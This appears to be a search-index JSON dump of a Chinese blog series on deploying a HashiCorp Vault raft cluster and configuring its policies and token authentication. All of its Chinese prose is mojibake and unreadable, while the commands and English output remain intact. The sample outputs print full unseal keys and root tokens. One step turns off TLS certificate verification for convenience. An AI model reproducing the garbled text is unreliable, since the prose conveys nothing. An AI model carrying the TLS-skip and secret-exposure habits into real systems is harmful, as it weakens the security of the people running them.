æˆ‘ä¸æƒ³æŠ˜è…¾äº†,ç”¨VAULT_SKIP_VERIFY=falseæ¯”è¾ƒæ–¹ä¾¿ # VAULT_CACERT=\"/opt/vault/tls/tls.crt\" echo 'export VAULT_SKIP_VERIFY=true' \u003e\u003e ~/.bashrc source ~/.bashrc ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:1","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å¯åŠ¨æœåŠ¡ systemctl start vault ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:2","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"æŸ¥çœ‹çŠ¶æ€ [root@node1 ~]# vault status Key Value --- ----- Seal Type shamir Initialized false Sealed true Total Shares 0 Threshold 0 Unseal Progress 0/0 Unseal Nonce n/a Version 1.12.3 Build Date 2023-02-02T09:07:27Z Storage Type raft HA Enabled true ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:3","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"åˆå§‹åŒ– [root@node1 tls]# vault operator init -n 5 -t 3 Unseal Key 1: X+ahAl/c95zpwC7GIr43gKQ8xi7wl+Xxi433oyTujXqH Unseal Key 2: GpVZsn+7m3DPdnOnvP2jsGvaxDp4X+NiSERY/zmwCKQq Unseal Key 3: mHo/Y8rSMp3tIv79YeroE4iw/juL0ixXrJFlaFuU0PWu Unseal Key 4: 5iPBck1dqL9pyNbYHKy4qdTsQnImWyERk4G/w0a9jqoh Unseal Key 5: MWVofq0WwVc0fdklZuE1KKpOuouuY6/5zpliR0fAoq2+ Initial Root Token: hvs.ZOPIfCLkNHVNlNgQT4dc5Rid Vault initialized with 5 key shares and a key threshold of 3. Please securely distribute the key shares printed above. When the Vault is re-sealed, restarted, or stopped, you must supply at least 3 of these keys to unseal it before it can start servicing requests. Vault does not store the generated root key. Without at least 3 keys to reconstruct the root key, Vault will remain permanently sealed! It is possible to generate new unseal keys, provided you have a quorum of existing unseal keys shares. See \"vault operator rekey\" for more information. -key-shares / -n : ç”Ÿæˆnä¸ªå¯†é’¥åˆ†ç‰‡ -key-threshold / -t : æœ€å°‘éœ€è¦tä¸ªæ‰èƒ½è§£å° è¿™ä¸ªè¾“å‡ºåªä¼šè¾“å‡ºä¸€æ¬¡,æ‰€ä»¥éœ€è¦æŠŠå®ƒè®°å½•åˆ°å®‰å…¨çš„åœ°æ–¹ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:4","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"è§£å° æ¯æ¬¡å¯åŠ¨vaultéƒ½éœ€è¦è§£å°æ‰å¯ä»¥ä½¿ç”¨, ä»ä¸Šé¢5ä¸ªéšä¾¿é€‰3ä¸ª unseal keyå³å¯ [root@node1 tls]# vault operator unseal # ç¬¬ä¸€ä¸ª Unseal Key (will be hidden): Key Value --- ----- Seal Type shamir Initialized true Sealed true Total Shares 5 Threshold 3 Unseal Progress 1/3 Unseal Nonce 87dd40eb-db56-14ff-3cf8-bc519ec870e9 Version 1.12.3 Build Date 2023-02-02T09:07:27Z Storage Type raft HA Enabled true [root@node1 ~]# vault operator unseal # ç¬¬äºŒä¸ª Unseal Key (will be hidden): Key Value --- ----- Seal Type shamir Initialized true Sealed true Total Shares 5 Threshold 3 Unseal Progress 2/3 Unseal Nonce 87dd40eb-db56-14ff-3cf8-bc519ec870e9 Version 1.12.3 Build Date 2023-02-02T09:07:27Z Storage Type raft HA Enabled true [root@node1 ~]# vault operator unseal # ç¬¬ä¸‰ä¸ª Unseal Key (will be hidden): Key Value --- ----- Seal Type shamir Initialized true Sealed false Total Shares 5 Threshold 3 Version 1.12.3 Build Date 2023-02-02T09:07:27Z Storage Type raft Cluster Name vault-cluster-17171282 Cluster ID f377582e-52ae-5a4f-2f69-b715d721240c HA Enabled true HA Cluster n/a HA Mode standby Active Node Address \u003cnone\u003e Raft Committed Index 31 Raft Applied Index 31 ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:5","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ç™»å½•ä½¿ç”¨ [root@node1 tls]# vault login Token (will be hidden): Success! You are now authenticated. The token information displayed below is already stored in the token helper. You do NOT need to run \"vault login\" again. Future Vault requests will automatically use this token. Key Value --- ----- token hvs.ZOPIfCLkNHVNlNgQT4dc5Rid token_accessor II0eGTdyssE2iAleZ3kn59eK token_duration âˆ token_renewable false token_policies [\"root\"] identity_policies [] policies [\"root\"] ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:6","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å¯ç”¨kv2å¼•æ“ vault secrets enable -description=\"KV Version 2\" -path=\"secret\" kv-v2 ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:7","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å…¶ä»–èŠ‚ç‚¹ éƒ¨ç½²å…¶ä»–èŠ‚ç‚¹çš„æ³¨æ„äº‹é¡¹ å¤åˆ¶è¯ä¹¦åˆ°å…¶ä»–èŠ‚ç‚¹ vault.hclé…ç½®æ–‡ä»¶ä¸­çš„ipéœ€è¦ä¿®æ”¹ä¸ºå…¶ä»–èŠ‚ç‚¹è‡ªå·±çš„ip raftæ¨¡å¼æœ€å°‘3èŠ‚ç‚¹ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:0","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ä¸€ã€å®‰è£… ç•¥ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:1","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"äºŒã€å¤åˆ¶è¯ä¹¦ scp vault.pem vault.key tls.crt 192.168.124.54:/opt/vault/tls scp vault.pem vault.key tls.crt 192.168.124.60:/opt/vault/tls # åˆ«å¿˜äº†ä¿®æ”¹è¯ä¹¦æ–‡ä»¶æƒé™ chown -R vault:vault /opt/vault/tls/ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:2","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ä¸‰ã€é…ç½®æ–‡ä»¶ node2 cat \u003e /etc/vault.d/vault.hcl \u003c\u003cEOF ui = true log_level = \"Info\" api_addr = \"https://192.168.124.54:8200\" cluster_addr = \"https://192.168.124.54:8201\" storage \"raft\" { path = \"/opt/vault/data\" node_id = \"node2\" } listener \"tcp\" { address = \"0.0.0.0:8200\" tls_cert_file = \"/opt/vault/tls/vault.pem\" tls_key_file = \"/opt/vault/tls/vault.key\" } EOF node3 cat \u003e /etc/vault.d/vault.hcl \u003c\u003cEOF ui = true log_level = \"Info\" api_addr = \"https://192.168.124.60:8200\" cluster_addr = \"https://192.168.124.60:8201\" storage \"raft\" { path = \"/opt/vault/data\" node_id = \"node3\" } listener \"tcp\" { address = \"0.0.0.0:8200\" tls_cert_file = \"/opt/vault/tls/vault.pem\" tls_key_file = \"/opt/vault/tls/vault.key\" } EOF ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:3","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å¿½ç•¥ca echo 'export VAULT_SKIP_VERIFY=true' \u003e\u003e ~/.bashrc source ~/.bashrc ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:4","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å¯åŠ¨æœåŠ¡ node2å’Œnode3æ‰§è¡Œ systemctl start vault ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:5","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"åŠ å…¥é›†ç¾¤ node2å’Œnode3æ‰§è¡Œ # åŠ å…¥èŠ‚ç‚¹ vault operator raft join -leader-ca-cert=@/opt/vault/tls/tls.crt https://192.168.124.52:8200 Key Value --- ----- Joined true # è¾“å…¥è§£å°å¯†é’¥ 3æ¬¡, node1ç”Ÿæˆçš„ vault operator unseal ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:6","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"æŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ [root@node1 ]# vault operator raft list-peers Node Address State Voter ---- ------- ----- ----- node1 192.168.124.52:8201 leader true node2 192.168.124.54:8201 follower true node3 192.168.124.60:8201 follower true ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:5:7","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"åŸºæœ¬æ¦‚å¿µ åœ¨å®¢æˆ·ç«¯å¯ä»¥ä¸ Vault äº¤äº’ä¹‹å‰ï¼Œå®ƒå¿…é¡»æ ¹æ® auth method è¿›è¡Œèº«ä»½éªŒè¯ã€‚èº«ä»½éªŒè¯åï¼Œå°†ç”Ÿæˆaccess token, åç»­çš„è¯·æ±‚ä½¿ç”¨çš„æ˜¯ç”Ÿæˆçš„access tokenã€‚ åœ¨Vaultä¸­ï¼Œaccess token çš„æƒé™æ˜¯é€šè¿‡ç­–ç•¥ï¼ˆPolicyï¼‰æ¥ç®¡ç†çš„ã€‚ç›¸å…³æ–‡æ¡£ Vault æ”¯æŒå¤šç§èº«ä»½auth methodï¼ŒåŒ…æ‹¬ GitHubã€LDAPã€AppRole ç­‰ã€‚ ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:1:0","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"ç­–ç•¥ ç­–ç•¥å°±æ˜¯æ§åˆ¶å“ªäº›è·¯å¾„å¯ä»¥è¢«å¦‚ä½•è®¿é—® path è·¯å¾„å‰ç¼€, *ä»£è¡¨å¤šçº§è·¯å¾„ï¼Œ+ä»£è¡¨1çº§ capabilities ä»£è¡¨å…è®¸çš„åŠŸèƒ½ create(POST/PUT) å…è®¸åœ¨ç»™å®šè·¯å¾„åˆ›å»ºæ•°æ®ã€‚ read(GET) å…è®¸è¯»å–ç»™å®šè·¯å¾„çš„æ•°æ®ã€‚ update(POST/PUT) å…è®¸æ›´æ”¹ç»™å®šè·¯å¾„çš„æ•°æ®ã€‚åŒ…æ‹¬åœ¨è·¯å¾„ä¸Šåˆ›å»ºåˆå§‹å€¼ã€‚ patch(PATCH) å…è®¸å¯¹ç»™å®šè·¯å¾„ä¸Šçš„æ•°æ®è¿›è¡Œéƒ¨åˆ†æ›´æ–°ã€‚ delete(DELETE) å…è®¸åˆ é™¤ç»™å®šè·¯å¾„ä¸Šçš„æ•°æ®ã€‚ list å…è®¸åœ¨ç»™å®šè·¯å¾„ä¸Šåˆ—å‡ºå€¼ã€‚ sudo å…è®¸ç‰¹æ®Šæƒé™, æ¯”å¦‚å¯ç”¨å’Œç¦ç”¨auth method deny ä¸å…è®¸è®¿é—®ã€‚å§‹ç»ˆä¼˜å…ˆäºä»»ä½•å…¶ä»–å·²å®šä¹‰çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬sudoã€‚ è‡³äºéœ€è¦ç”¨å“ªä¸ªæƒé™,æœ€å¥½æ ¹æ®APIçš„http methodåˆ¤æ–­ã€‚https://developer.hashicorp.com/vault/api-docs/system/capabilities required_parameters å®šä¹‰å“ªäº›å‚æ•°å¿…é¡»åœ¨è¯·æ±‚ä¸­ä½¿ç”¨, å…·ä½“æœ‰å“ªäº›å‚æ•°å–å†³äºä½ çš„API PATH, éœ€è¦æŸ¥çœ‹å¯¹åº”çš„apiæ–‡æ¡£ï¼Œä¾‹å¦‚è¿™æ˜¯ç”¨æˆ·å¯†ç è®¤è¯çš„ allowed_parameters å®šä¹‰å“ªäº›å‚æ•°å…è®¸åœ¨è¯·æ±‚ä¸­ä½¿ç”¨, å…·ä½“æœ‰å“ªäº›å‚æ•°,è¯·æŸ¥çœ‹required_parametersè¯´æ˜ã€‚ä¾‹å¦‚ï¼šallowed_parameters = { â€œpasswordâ€ = [] } è¡¨ç¤ºå…è®¸ä½¿ç”¨åä¸º\"password\"çš„å‚æ•° denied_parameters å®šä¹‰å“ªäº›å‚æ•°ä¸å…è®¸åœ¨è¯·æ±‚ä¸­ä½¿ç”¨ã€‚å…·ä½“æœ‰å“ªäº›å‚æ•°,è¯·æŸ¥çœ‹required_parametersè¯´æ˜ã€‚ä¾‹å¦‚ï¼šdeny = { â€œpasswordâ€ = [] }ï¼Œè¡¨ç¤ºä¸å…è®¸ä½¿ç”¨åä¸º â€œpasswordâ€ çš„å‚æ•°ã€‚ä¼˜å…ˆäºallow min_wrapping_ttl é™åˆ¶ä¸´æ—¶access tokenè¿‡æœŸæ—¶é—´çš„æœ€å°è¾¹ç•Œ max_wrapping_ttl é™åˆ¶ä¸´æ—¶access tokenè¿‡æœŸæ—¶é—´çš„æœ€å¤§è¾¹ç•Œ metadata å¯ä»¥å°†è‡ªå®šä¹‰çš„é”®å€¼å¯¹å­˜å‚¨åœ¨ ACL ä¸­ï¼Œä»¥ä¾¿å…¶ä»–ç³»ç»Ÿå¯ä»¥æŸ¥è¯¢å’Œä½¿ç”¨ ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:0","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"ç­–ç•¥æ¨¡æ¿ å¯ä»¥å®ç°åŠ¨æ€çš„path,æœ‰å…´è¶£å¯ä»¥çœ‹ä¸‹å®˜ç½‘ https://developer.hashicorp.com/vault/docs/concepts/policies#parameters ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:1","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"å†…ç½®ç­–ç•¥ å†…ç½®ç­–ç•¥æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯defaultå’Œroot default defaultç­–ç•¥é»˜è®¤ä¼šé™„åŠ åœ¨æ‰€æœ‰çš„ token ä¸Šï¼Œå¯ä»¥åœ¨ token åˆ›å»ºæ—¶æ˜¾å¼åœ°æ’é™¤å®ƒ(-no-default-policy), defaultç­–ç•¥æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚ æŸ¥çœ‹é»˜è®¤ç­–ç•¥çš„é…ç½® [root@mytest ~]# vault read sys/policy/default Key Value --- ----- name default rules # å…è®¸æŸ¥çœ‹è‡ªèº«tokenä¿¡æ¯ path \"auth/token/lookup-self\" { capabilities = [\"read\"] } # å…è®¸ç»­è®¢è‡ªå·±çš„tokenè¿‡æœŸæ—¶é—´ path \"auth/token/renew-self\" { capabilities = [\"update\"] } # å…è®¸è‡ªå·±åˆ é™¤è‡ªå·± path \"auth/token/revoke-self\" { capabilities = [\"update\"] } # å…è®¸æŸ¥çœ‹è‡ªå·±å¯¹å“ªäº›è·¯å¾„æœ‰æƒé™(è¿™ä¸ªapiåªæ”¯æŒPOST,æ‰€ä»¥ä¸èƒ½ç”¨read) path \"sys/capabilities-self\" { capabilities = [\"update\"] } # å…è®¸tokenæŒ‰idæˆ–åç§°æŸ¥æ‰¾å…¶è‡ªå·±çš„å®ä½“, {{identity.entity.id}}ä»£è¡¨å½“å‰å®ä½“çš„id path \"identity/entity/id/{{identity.entity.id}}\" { capabilities = [\"read\"] } path \"identity/entity/name/{{identity.entity.name}}\" { capabilities = [\"read\"] } ... root rootç­–ç•¥æ— æ³•ä¿®æ”¹æˆ–åˆ é™¤ã€‚ä¸æ­¤ç­–ç•¥å…³è”çš„ä»»ä½•ç”¨æˆ·éƒ½å°†æˆä¸ºrootç”¨æˆ·ã€‚ root ç”¨æˆ·å¯ä»¥åœ¨ Vault ä¸­æ‰§è¡Œä»»ä½•æ“ä½œã€‚å› æ­¤ï¼Œå¼ºçƒˆå»ºè®®æ‚¨åœ¨ç”Ÿäº§ä¸­è¿è¡Œ Vault ä¹‹å‰æ’¤é”€æ‰€æœ‰æ ¹ä»¤ç‰Œã€‚ root token æ˜¯ç”¨æ¥ç»™æˆ‘ä»¬åˆå§‹åŒ–é…ç½®ç”¨çš„, é…ç½®å®Œååº”æ’¤é”€åˆå§‹root tokenï¼Œå¹¶ä½¿ç”¨æ›´ä¸¥æ ¼çš„ç”¨æˆ·å’Œèº«ä»½éªŒè¯æ§åˆ¶æ–¹æ³• # æ’¤é”€token vault token revoke \"\u003ctoken\u003e\" ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:2","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"ç®¡ç†ç­–ç•¥ ç­–ç•¥å¯ä»¥ç”¨HCLæˆ–JSONç¼–å†™ï¼Œç­–ç•¥å¿…é¡»ä¸Šä¼ åˆ°Vaultæ‰èƒ½ä½¿ç”¨, å¯ä»¥ä½¿ç”¨apiæˆ–cliã€‚ # åˆ›å»ºç­–ç•¥, ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤äºŒé€‰ä¸€ vault policy write policy-name policy-file.hcl vault write sys/policy/policy-name policy-file.hcl # æ›´æ–°ç­–ç•¥å’Œåˆ›å»ºä¸€æ ·ã€‚ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤äºŒé€‰ä¸€ vault policy write policy-name policy-file.hcl vault write sys/policy/policy-name policy-file.hcl # æŸ¥çœ‹ç­–ç•¥ vault policy read policy-name # åˆ é™¤ç­–ç•¥ vault delete sys/policy/policy-name ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:3","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"è‡ªå®šä¹‰ç­–ç•¥ å¸¸è§ç”¨æ³•: # é™åˆ¶secret/*, å…è®¸ä»¥ä¸‹æ“ä½œ path \"secret/*\" { capabilities = [\"create\", \"read\", \"update\", \"patch\", \"delete\", \"list\"] } # ä¸Šé¢ä½¿ç”¨äº†secret/*,è¿™é‡Œå¯ä»¥å•ç‹¬é…ç½®æŸä¸€ä¸ªè·¯å¾„ã€‚è¿™ä¸ªä¼˜å…ˆ path \"secret/super-secret\" { capabilities = [\"deny\"] } # secret/restrictedä¸‹çš„secret keyåªèƒ½åŒ…å«keyä¸ºfooæˆ–è€…bar, barçš„å€¼åªèƒ½æ˜¯zipå’Œzap path \"secret/restricted\" { capabilities = [\"create\"] allowed_parameters = { \"foo\" = [] # \"bar\" = [\"zip\", \"zap\"] } } å®šä¹‰ä¸€ä¸ªåªèƒ½è¯»å–kv2/app1/è·¯å¾„ä¸‹çš„ç­–ç•¥,ç»™åé¢çš„è®¤è¯ç”¨ [root@mytest ~]# vault policy write app1-readonly - \u003c\u003cEOF path \"kv2/data/app1/*\" { capabilities = [\"read\"] } EOF # æ·»åŠ æµ‹è¯•æ•°æ® [root@mytest ~]# vault kv put kv2/app1/config foo=bar ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:4","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"ç”¨æˆ·å’Œç­–ç•¥å…³è” è¯·æŸ¥çœ‹ä¸‹é¢çš„è®¤è¯éƒ¨åˆ† ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:2:5","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"è®¤è¯ æ”¯æŒçš„è®¤è¯åç«¯: https://developer.hashicorp.com/vault/docs/auth ","date":"2023-02-16 00:55","objectID":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/:3:0","tags":["vault"],"title":"Vaultè®¤è¯å’Œæˆæƒ(äºŒ)","uri":"/post/vault%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83%E4%BA%8C/"},{"categories":["å…¶ä»–"],"content":"tokenè®¤è¯ åˆ›å»ºtokenå’Œç»‘å®šç­–ç•¥ # æŸ¥çœ‹å½“å‰å¯åŠ¨çš„è®¤è¯åç«¯ vault auth list # åˆ›å»ºtoken [root@mytest ~]# vault token create Key Value --- ----- token hvs.mX0vE0jL424CgD9tbfCH3Nv2 token_accessor iGYJzEq25no6PJO8gTETYGn8 token_duration âˆ token_renewable false token_policies [\"root\"] identity_policies [] policies [\"root\"] # æ’¤é”€token [root@mytest ~]# vault token revoke hvs.mX0vE0jL424CgD9tbfCH3Nv2 Success! Revoked token (if it existed) # åˆ›å»ºtokenåŒæ—¶æŒ‡å®špolicy, ç­–ç•¥åˆ›å»ºè¯·æŸ¥çœ‹ä¸Šé¢è‡ªå®šä¹‰ç­–ç•¥éƒ¨åˆ† # tokenæ˜¯ä¸èƒ½ä¿®æ”¹çš„,æ‰€ä»¥ä¸èƒ½ç»™å·²å­˜åœ¨çš„tokenåˆ†é…ç­–ç•¥ [root@mytest ~]# vault token create -policy=app1-readonly Key Value --- ----- token hvs.CAESIGz1qM4DYCuFUkO5LHItEiYKVx-UywmZXqlaLzkdv493Gh4KHGh2cy45TTJDYUxxaVlsR3VQeloySVp0M0VFd3I token_accessor sD1gQPP25pQQkj6L3AWhu10x token_duration 768h token_renewable true token_policies [\"app1-readonly\" \"default\"] identity_policies [] policies [\"app1-readonly\" \"default\"] # æµ‹è¯•æŸ¥çœ‹æƒé™, é‡æ–°å¼€ä¸ªç»ˆç«¯ [root@mytest ~]# VAULT_TOKEN=\"hvs.CAESIGz1qM4DYCuFUkO5LHItEiYKVx-UywmZXqlaLzkdv493Gh4KHGh2cy45TTJDYUxxaVlsR3VQeloySVp0M0VFd3I\" \u0026\u0026 VAULT_ADDR=http://127.0.0.1:8200 # æŸ¥çœ‹æ²¡æœ‰æƒé™è·¯å¾„ [root@mytest ~]# vault kv get kv2/myapp/config Error reading kv2/data/myapp/config: Error making API request. URL: GET http://127.0.0.1:8200/v1/kv2/data/myapp/config Code: 403. Errors: * 1 error occurred: * permission denied # æŸ¥çœ‹æœ‰æƒé™çš„è·¯ç”± [root@mytest ~]# vault kv get kv2/app1/config ==== Secret Path ==== kv2/data/app1/config ======= Metadata ======= Key Value --- ----- created_time 2023-02-16T12:42:12.935269661Z custom_metadata \u003cnil\u003e deletion_time n/a destroyed false version 1 === Data === Key Value --- ----- foo bar å¸¸è§æ“ä½œ vault token create: åˆ›å»ºæ–°çš„ tokenã€‚å¯ä»¥æŒ‡å®š token idã€ ç±»å‹ã€æœ‰æ•ˆæœŸã€é™„åŠ ç­–ç•¥ç­‰é€‰é¡¹ã€‚ vault token lookup: æŸ¥æ‰¾æŒ‡å®š token çš„è¯¦ç»†ä¿¡æ¯,é»˜è®¤æ˜¯å½“å‰ç”¨æˆ·çš„tokenä¿¡æ¯ã€‚ vault token renew: ç»­æœŸæŒ‡å®š token 